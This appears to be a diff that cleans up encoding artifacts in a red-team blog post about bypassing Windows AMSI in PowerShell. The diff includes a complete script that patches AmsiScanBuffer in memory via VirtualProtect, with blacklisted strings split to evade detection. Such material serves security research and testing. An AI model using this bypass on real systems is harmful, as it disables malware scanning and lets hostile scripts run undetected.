@@ -68,8 +68,7 @@ effectively turns off AMSI in a PowerShell session.
 Today, the 1-liner gets caught because strings such as 'AmsiUtils' and
 'amsiInitFaled' have been black listed by AMSI. This turned AMSI bypassing into a
 bit of a cat and mouse game. [At some point](
-https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasi=
-on/
+https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
 ), it was possible to adapt this 1-liner just by splitting the blacklisted
 strings, or switching from single quote to double quotes.
 
@@ -105,36 +104,32 @@ https://github.com/webbie321/AmsiScanBufferBypass/blob/master/ASBBypass.ps1)).
 
 
 ```
-$Win32 =3D @"
+$Win32 = @"
 using System;
 using System.Runtime.InteropServices;
 public class Win32 {
     [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string
-procName);
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
     [DllImport("kernel32")]
     public static extern IntPtr LoadLibrary(string name);
     [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
-dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
 
 Add-Type $Win32
 
-$LoadLibrary =3D [Win32]::LoadLibrary("am" + "si.dll")
-$Address =3D [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffe=
-r")
-$p =3D 0
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch =3D [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
 Note that the "Add-Type" technique is not the best if [trying to remain
 stealthy](
-https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypa=
-ss),
+https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass),
 but we will ignore that for today.
 
 Let's try to run this .ps1 on an up to date Windows 10 running
@@ -148,8 +143,7 @@ As hinted previously, the script now gets caught. We will focus on
 "refreshing" it and making it work. As a script kiddie, we decided that we'd rather not have to change anything, so we will make **zero modification** to the actual script. Just a little bit of PowerShell magic.
 
 Before we get started, this [blog post](
-https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypas=
-s-to-work-again/)
+https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/)
 shows that it can be rewritten into a working bypass with a little bit of
 effort. The result still works, six months later. But that kind of rewriting is way too much
 thinking for a script kiddie.
@@ -181,7 +175,7 @@ parts.
 
 Not very useful if we just want a one liner, but bear with me.
 
-### Digging with Frida
+### Digging up with Frida
 
 Let's use [Frida](https://frida.re/) to check out what is happening under
 the hood with the AMSI APIs, following the technique described in [this post](
@@ -365,8 +359,7 @@ can? This is what we'll be doing in our next section using Runspaces.
 operate within. While the runspace that is used with the PowerShell console
 is restricted to a single thread, you can use additional runspaces to allow
 for use of additional threads" [(source)](
-https://adamtheautomator.com/powershell-multithreading/#Runspaces_Kinda_Lik=
-e_Jobs_but_Faster
+https://adamtheautomator.com/powershell-multithreading/#Runspaces_Kinda_Like_Jobs_but_Faster
 )
 
 In a penetration testing/red teaming context, Powershell runspace  has been
